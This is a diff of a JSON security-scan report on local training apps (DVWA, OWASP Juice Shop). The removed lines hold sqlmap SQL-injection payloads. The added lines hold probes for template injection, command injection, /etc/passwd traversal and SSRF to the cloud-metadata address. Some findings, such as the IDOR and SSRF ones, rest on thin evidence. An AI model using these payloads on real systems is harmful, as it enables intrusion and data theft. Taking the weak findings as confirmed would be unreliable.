@@ -1,40 +1,482 @@
 {
-  "target": "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit",
-  "generated_at": "2026-04-25T12:27:39.986556Z",
-  "confirmed_count": 2,
+  "target": "http://localhost:3000/",
+  "generated_at": "2026-05-02T17:23:45.107550Z",
+  "confirmed_count": 9,
   "confirmed_vulnerabilities": [
     {
-      "type": "sql_injection",
-      "source_action": "test_sqli",
-      "endpoint": "http://localhost:8080/vulnerabilities/sqli/?id=1&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5(999999999),1,user()))))--+-&Submit=Submit&PagePrincipale/rss",
-      "base": "http://localhost:8080/vulnerabilities/sqli/",
-      "params": [
-        "PagePrincipale/rss",
-        "Submit",
-        "id"
-      ],
-      "reason": "finding",
+      "type": "a01-broken-access-control-idor",
+      "source_action": "validator",
+      "endpoint": "",
+      "base": "",
+      "params": [],
+      "reason": "Attackers can access other users' data directly by manipulating object references (IDs, UUIDs, etc.)",
       "proof": {
-        "exit_code": 0,
-        "target_url": "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit&PagePrincipale%2Frss=",
-        "output_tail": "       __H__\n ___ ___[\"]_____ ___ ___  {1.8.4#stable}\n|_ -| . [']     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 17:57:39 /2026-04-25/\n\n[17:57:39] [WARNING] provided value for parameter 'PagePrincipale/rss' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly\n[17:57:39] [INFO] resuming back-end DBMS 'mysql' \n[17:57:39] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: id (GET)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)\n    Payload: id=1' OR NOT 7910=7910#&Submit=Submit&PagePrincipale/rss=\n\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: id=1' AND (SELECT 4796 FROM(SELECT COUNT(*),CONCAT(0x716a626b71,(SELECT (ELT(4796=4796,1))),0x716a786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kHhZ&Submit=Submit&PagePrincipale/rss=\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=1' AND (SELECT 8082 FROM (SELECT(SLEEP(5)))wPPt)-- NrLy&Submit=Submit&PagePrincipale/rss=\n\n    Type: UNION query\n    Title: MySQL UNION query (NULL) - 2 columns\n    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a626b71,0x746179476365765164716c6d597174484c7369514c54574874795a62514c4c427959556b4141454f,0x716a786b71)#&Submit=Submit&PagePrincipale/rss=\n---\n[17:57:39] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Debian 9 (stretch)\nweb application technology: Apache 2.4.25\nback-end DBMS: MySQL >= 5.0 (MariaDB fork)\n[17:57:39] [INFO] fetched data logged to text files under '/home/dk/snap/code/220/.local/share/sqlmap/output/localhost'\n[17:57:39] [WARNING] your sqlmap version is outdated\n\n[*] ending @ 17:57:39 /2026-04-25/"
-      }
+        "request": {
+          "url": "http://localhost:3000/user/1",
+          "method": "GET"
+        },
+        "response": {
+          "status": 200,
+          "snippet": "<!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n  <meta charset=\"utf-8\">\n  <title>OWASP Juice Shop</title>\n  <meta name=\"description\" content=\"Probably the m"
+        },
+        "matched": "direct_object_reference_accessible",
+        "extra": {
+          "coverage_markers": [
+            "route_access_control",
+            "object_level_authorization_idor",
+            "function_level_authorization",
+            "privilege_escalation",
+            "forced_browsing_sensitive_paths"
+          ]
+        }
+      },
+      "validator_id": "",
+      "validator_class": "",
+      "severity": "high",
+      "confidence": 0.85,
+      "compliance_tags": {
+        "OWASP": "General Security Requirement",
+        "PCI-DSS": "Review Required",
+        "SOC2": "Control Review Required",
+        "NIST": "Control Review Required"
+      },
+      "business_risk": "OWASP: General Security Requirement | PCI-DSS: Review Required | SOC2: Control Review Required | NIST: Control Review Required"
     },
     {
-      "type": "sql_injection",
-      "source_action": "test_sqli",
-      "endpoint": "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit",
-      "base": "http://localhost:8080/vulnerabilities/sqli/",
-      "params": [
-        "Submit",
-        "id"
-      ],
-      "reason": "dedup",
+      "type": "missing-security-headers",
+      "source_action": "validator",
+      "endpoint": "",
+      "base": "",
+      "params": [],
+      "reason": "Missing headers can increase exposure to clickjacking and some XSS scenarios.",
       "proof": {
-        "exit_code": 0,
-        "target_url": "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit",
-        "output_tail": "___\n       __H__\n ___ ___[)]_____ ___ ___  {1.8.4#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 17:57:39 /2026-04-25/\n\n[17:57:39] [INFO] resuming back-end DBMS 'mysql' \n[17:57:39] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: id (GET)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)\n    Payload: id=1' OR NOT 7910=7910#&Submit=Submit&PagePrincipale/rss=\n\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: id=1' AND (SELECT 4796 FROM(SELECT COUNT(*),CONCAT(0x716a626b71,(SELECT (ELT(4796=4796,1))),0x716a786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kHhZ&Submit=Submit&PagePrincipale/rss=\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=1' AND (SELECT 8082 FROM (SELECT(SLEEP(5)))wPPt)-- NrLy&Submit=Submit&PagePrincipale/rss=\n\n    Type: UNION query\n    Title: MySQL UNION query (NULL) - 2 columns\n    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a626b71,0x746179476365765164716c6d597174484c7369514c54574874795a62514c4c427959556b4141454f,0x716a786b71)#&Submit=Submit&PagePrincipale/rss=\n---\n[17:57:39] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Debian 9 (stretch)\nweb application technology: Apache 2.4.25\nback-end DBMS: MySQL >= 5.0 (MariaDB fork)\n[17:57:39] [INFO] fetched data logged to text files under '/home/dk/snap/code/220/.local/share/sqlmap/output/localhost'\n[17:57:39] [WARNING] your sqlmap version is outdated\n\n[*] ending @ 17:57:39 /2026-04-25/"
-      }
+        "request": "http://localhost:3000/",
+        "response": {
+          "Access-Control-Allow-Origin": "*",
+          "X-Content-Type-Options": "nosniff",
+          "X-Frame-Options": "SAMEORIGIN",
+          "Feature-Policy": "payment 'self'",
+          "X-Recruiting": "/#/jobs",
+          "Accept-Ranges": "bytes",
+          "Cache-Control": "public, max-age=0",
+          "Last-Modified": "Sat, 02 May 2026 09:28:25 GMT",
+          "ETag": "W/\"124fa-19de8048b76\"",
+          "Content-Type": "text/html; charset=UTF-8",
+          "Content-Length": "75002",
+          "Vary": "Accept-Encoding",
+          "Date": "Sat, 02 May 2026 17:20:07 GMT",
+          "Connection": "close"
+        },
+        "matched": "CSP",
+        "extra": {
+          "coverage_markers": [
+            "missing_security_headers_as_monitoring_signal",
+            "insufficient_monitoring_indicators",
+            "audit_visibility_hardening_gap",
+            "low_detection_surface_signal",
+            "telemetry_control_gap"
+          ]
+        }
+      },
+      "validator_id": "",
+      "validator_class": "",
+      "severity": "info",
+      "confidence": 0.8,
+      "compliance_tags": {
+        "OWASP": "General Security Requirement",
+        "PCI-DSS": "Review Required",
+        "SOC2": "Control Review Required",
+        "NIST": "Control Review Required"
+      },
+      "business_risk": "OWASP: General Security Requirement | PCI-DSS: Review Required | SOC2: Control Review Required | NIST: Control Review Required"
+    },
+    {
+      "type": "a02-crypto-missing-security-headers",
+      "source_action": "validator",
+      "endpoint": "",
+      "base": "",
+      "params": [],
+      "reason": "Missing 4 security headers: strict-transport-security (HSTS - enforces HTTPS), x-xss-protection (legacy XSS protection), content-security-policy (controls resource loading). This reduces defense against various attacks.",
+      "proof": {
+        "request": {
+          "url": "http://localhost:3000/"
+        },
+        "response": {
+          "missing_headers": [
+            "strict-transport-security (HSTS - enforces HTTPS)",
+            "x-xss-protection (legacy XSS protection)",
+            "content-security-policy (controls resource loading)",
+            "referrer-policy (controls referrer information)"
+          ]
+        },
+        "matched": "strict-transport-security (HSTS - enforces HTTPS), x-xss-protection (legacy XSS protection), content-security-policy (controls resource loading)",
+        "extra": {
+          "coverage_markers": [
+            "weak_tls_versions",
+            "plaintext_sensitive_transport",
+            "missing_transport_encryption",
+            "insecure_cipher_or_protocol_policy",
+            "sensitive_data_exposure_in_transit"
+          ]
+        }
+      },
+      "validator_id": "",
+      "validator_class": "",
+      "severity": "medium",
+      "confidence": 0.8,
+      "compliance_tags": {
+        "OWASP": "General Security Requirement",
+        "PCI-DSS": "Review Required",
+        "SOC2": "Control Review Required",
+        "NIST": "Control Review Required"
+      },
+      "business_risk": "OWASP: General Security Requirement | PCI-DSS: Review Required | SOC2: Control Review Required | NIST: Control Review Required"
+    },
+    {
+      "type": "a07-identification-and-authentication-failures",
+      "source_action": "validator",
+      "endpoint": "",
+      "base": "",
+      "params": [],
+      "reason": "The login flow does not enforce expected authentication controls, enabling brute-force or session persistence abuse.",
+      "proof": {
+        "request": {
+          "target": "http://localhost:3000/accounting",
+          "payload": {
+            "username": "security-pipeline-test",
+            "password": "invalid-password"
+          }
+        },
+        "response": {
+          "login_response_status": 200,
+          "findings": [
+            "missing_rate_limiting"
+          ]
+        },
+        "matched": "missing_rate_limiting",
+        "extra": {
+          "login_like": true,
+          "attempts": [
+            {
+              "attempt": 1,
+              "status": 200,
+              "elapsed_s": 0.016
+            },
+            {
+              "attempt": 2,
+              "status": 200,
+              "elapsed_s": 0.015
+            },
+            {
+              "attempt": 3,
+              "status": 200,
+              "elapsed_s": 0.02
+            },
+            {
+              "attempt": 4,
+              "status": 200,
+              "elapsed_s": 0.022
+            }
+          ],
+          "set_cookie_headers": [],
+          "coverage_markers": [
+            "missing_login_rate_limit",
+            "insecure_remember_me_cookie_flags",
+            "weak_session_management_signal",
+            "credential_control_weakness",
+            "authentication_flow_hardening_gap"
+          ]
+        }
+      },
+      "validator_id": "",
+      "validator_class": "",
+      "severity": "high",
+      "confidence": 0.88,
+      "compliance_tags": {
+        "OWASP": "General Security Requirement",
+        "PCI-DSS": "Review Required",
+        "SOC2": "Control Review Required",
+        "NIST": "Control Review Required"
+      },
+      "business_risk": "OWASP: General Security Requirement | PCI-DSS: Review Required | SOC2: Control Review Required | NIST: Control Review Required"
+    },
+    {
+      "type": "a04-insecure-design",
+      "source_action": "validator",
+      "endpoint": "",
+      "base": "",
+      "params": [],
+      "reason": "The application appears to accept an out-of-order or elevated workflow state without enforcing the intended design.",
+      "proof": {
+        "request": {
+          "baseline_url": "http://localhost:3000/api/Challenges?stage=pending",
+          "probe_url": "http://localhost:3000/api/Challenges?stage=complete",
+          "param": "stage"
+        },
+        "response": {
+          "baseline_status": 200,
+          "probe_status": 200,
+          "baseline_denied": false,
+          "probe_denied": false
+        },
+        "matched": "stage=complete",
+        "extra": {
+          "template": "payment_flow",
+          "param": "stage",
+          "baseline_value": "pending",
+          "bypass_value": "complete",
+          "workflow_params": [
+            "step",
+            "state",
+            "status",
+            "phase",
+            "stage",
+            "action",
+            "workflow",
+            "role"
+          ],
+          "workflow_attempts": [
+            {
+              "template": "payment_flow",
+              "param": "stage",
+              "baseline_value": "pending",
+              "bypass_value": "complete",
+              "baseline_status": 200,
+              "probe_status": 200,
+              "baseline_denied": false,
+              "probe_denied": false,
+              "success_markers": true
+            }
+          ],
+          "coverage_markers": [
+            "workflow_bypass",
+            "state_transition_bypass",
+            "business_logic_flaw",
+            "idor_design_gap",
+            "missing_security_controls_by_design"
+          ]
+        }
+      },
+      "validator_id": "",
+      "validator_class": "",
+      "severity": "high",
+      "confidence": 0.89,
+      "compliance_tags": {
+        "OWASP": "General Security Requirement",
+        "PCI-DSS": "Review Required",
+        "SOC2": "Control Review Required",
+        "NIST": "Control Review Required"
+      },
+      "business_risk": "OWASP: General Security Requirement | PCI-DSS: Review Required | SOC2: Control Review Required | NIST: Control Review Required"
+    },
+    {
+      "type": "a03-injection-template",
+      "source_action": "validator",
+      "endpoint": "",
+      "base": "",
+      "params": [],
+      "reason": "The application appears to process template syntax or reflect a template evaluation marker.",
+      "proof": {
+        "request": {
+          "baseline_url": "http://localhost:3000/?q=injection-test",
+          "probe_url": "http://localhost:3000/?q=%7B%7B7%2A7%7D%7D",
+          "param": "q"
+        },
+        "response": {
+          "baseline_status": 200,
+          "probe_status": 200,
+          "template_marker_seen": true
+        },
+        "matched": "{{7*7}}",
+        "extra": {
+          "param": "q",
+          "payload": "{{7*7}}",
+          "attempted_payload_variants": [
+            "{{7*7}}",
+            "${7*7}",
+            "<%= 7*7 %>"
+          ],
+          "coverage_markers": [
+            "sql_injection",
+            "xss_reflected_or_stored",
+            "command_injection",
+            "template_injection",
+            "ldap_or_query_injection"
+          ]
+        }
+      },
+      "validator_id": "",
+      "validator_class": "",
+      "severity": "high",
+      "confidence": 0.88,
+      "compliance_tags": {
+        "OWASP": "General Security Requirement",
+        "PCI-DSS": "Review Required",
+        "SOC2": "Control Review Required",
+        "NIST": "Control Review Required"
+      },
+      "business_risk": "OWASP: General Security Requirement | PCI-DSS: Review Required | SOC2: Control Review Required | NIST: Control Review Required"
+    },
+    {
+      "type": "a03-injection-command",
+      "source_action": "validator",
+      "endpoint": "",
+      "base": "",
+      "params": [],
+      "reason": "The application reflected a command-execution marker, indicating possible command injection behavior.",
+      "proof": {
+        "request": {
+          "baseline_url": "http://localhost:3000/api?q=injection-test",
+          "probe_url": "http://localhost:3000/api?q=%7C%7Cecho+SECURITY_PIPELINE_A03",
+          "param": "q"
+        },
+        "response": {
+          "baseline_status": 500,
+          "probe_status": 500,
+          "command_marker_seen": true
+        },
+        "matched": "SECURITY_PIPELINE_A03",
+        "extra": {
+          "param": "q",
+          "payload": "||echo SECURITY_PIPELINE_A03",
+          "attempted_payload_variants": [
+            "||echo SECURITY_PIPELINE_A03",
+            ";echo SECURITY_PIPELINE_A03",
+            "$(echo SECURITY_PIPELINE_A03)"
+          ],
+          "coverage_markers": [
+            "sql_injection",
+            "xss_reflected_or_stored",
+            "command_injection",
+            "template_injection",
+            "ldap_or_query_injection"
+          ]
+        }
+      },
+      "validator_id": "",
+      "validator_class": "",
+      "severity": "high",
+      "confidence": 0.91,
+      "compliance_tags": {
+        "OWASP": "General Security Requirement",
+        "PCI-DSS": "Review Required",
+        "SOC2": "Control Review Required",
+        "NIST": "Control Review Required"
+      },
+      "business_risk": "OWASP: General Security Requirement | PCI-DSS: Review Required | SOC2: Control Review Required | NIST: Control Review Required"
+    },
+    {
+      "type": "a03-injection-file",
+      "source_action": "validator",
+      "endpoint": "",
+      "base": "",
+      "params": [],
+      "reason": "The application appears to expose local file content or file-read indicators through user-controlled input.",
+      "proof": {
+        "request": {
+          "baseline_url": "http://localhost:3000/api/Challenges?item=injection-test",
+          "probe_url": "http://localhost:3000/api/Challenges?item=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+          "param": "item"
+        },
+        "response": {
+          "baseline_status": 200,
+          "probe_status": 200,
+          "file_marker_seen": true
+        },
+        "matched": "/etc/passwd",
+        "extra": {
+          "param": "item",
+          "payload": "../../../../etc/passwd",
+          "attempted_payload_variants": [
+            "../../../../etc/passwd",
+            "..%2f..%2f..%2f..%2fetc/passwd"
+          ],
+          "coverage_markers": [
+            "sql_injection",
+            "xss_reflected_or_stored",
+            "command_injection",
+            "template_injection",
+            "ldap_or_query_injection"
+          ]
+        }
+      },
+      "validator_id": "",
+      "validator_class": "",
+      "severity": "high",
+      "confidence": 0.9,
+      "compliance_tags": {
+        "OWASP": "General Security Requirement",
+        "PCI-DSS": "Review Required",
+        "SOC2": "Control Review Required",
+        "NIST": "Control Review Required"
+      },
+      "business_risk": "OWASP: General Security Requirement | PCI-DSS: Review Required | SOC2: Control Review Required | NIST: Control Review Required"
+    },
+    {
+      "type": "a10-server-side-request-forgery",
+      "source_action": "validator",
+      "endpoint": "",
+      "base": "",
+      "params": [],
+      "reason": "The application appears to fetch attacker-controlled URLs, enabling internal network probing or metadata access.",
+      "proof": {
+        "request": {
+          "baseline_url": "http://localhost:3000/.well-known/security.txt?url=https%3A%2F%2Fexample.com%2F",
+          "probe_url": "http://localhost:3000/.well-known/security.txt?url=http%3A%2F%2F127.0.0.1",
+          "param": "url"
+        },
+        "response": {
+          "baseline_status": 200,
+          "probe_status": 200,
+          "probe_snippet": "Contact: mailto:donotreply@owasp-juice.shop\nEncryption: https://keybase.io/bkimminich/pgp_keys.asc?fingerprint=19c01cb7157e4645e9e2c863062a85a8cbfbdcda\nAcknowledgements: /#/score-board\nPreferred-languages: en, ar, az, bg, bn, ca, cs, da, de, ga, el, es, et, fi, fr, ka, he, hi, hu, id, it, ja, ko, lv, my, nl, no, pl, pt, ro, ru, si, sv, th, tr, uk, zh\nHiring: /#/jobs\nCsaf: http://localhost:3000/.well-known/csaf/provider-metadata.json\nExpires: Sun, 02 May 2027 09:28:23 GMT"
+        },
+        "matched": "localhost",
+        "extra": {
+          "param": "url",
+          "loopback_url": "http://127.0.0.1",
+          "candidate_params": [
+            "url",
+            "uri",
+            "dest",
+            "destination",
+            "next",
+            "redirect",
+            "path",
+            "callback",
+            "endpoint",
+            "target",
+            "host"
+          ],
+          "attempted_loopback_targets": [
+            "http://127.0.0.1",
+            "http://127.0.0.1:80",
+            "http://localhost",
+            "http://127.1",
+            "http://2130706433",
+            "http://0.0.0.0",
+            "http://[::1]",
+            "http://169.254.169.254/latest/meta-data/"
+          ],
+          "coverage_markers": [
+            "loopback_ssrf_probe",
+            "internal_network_reachability_via_ssrf",
+            "metadata_service_reachability_signal",
+            "url_fetch_allowlist_gap",
+            "server_side_request_validation_gap"
+          ]
+        }
+      },
+      "validator_id": "",
+      "validator_class": "",
+      "severity": "high",
+      "confidence": 0.95,
+      "compliance_tags": {
+        "OWASP": "General Security Requirement",
+        "PCI-DSS": "Review Required",
+        "SOC2": "Control Review Required",
+        "NIST": "Control Review Required"
+      },
+      "business_risk": "OWASP: General Security Requirement | PCI-DSS: Review Required | SOC2: Control Review Required | NIST: Control Review Required"
     }
   ]
 }
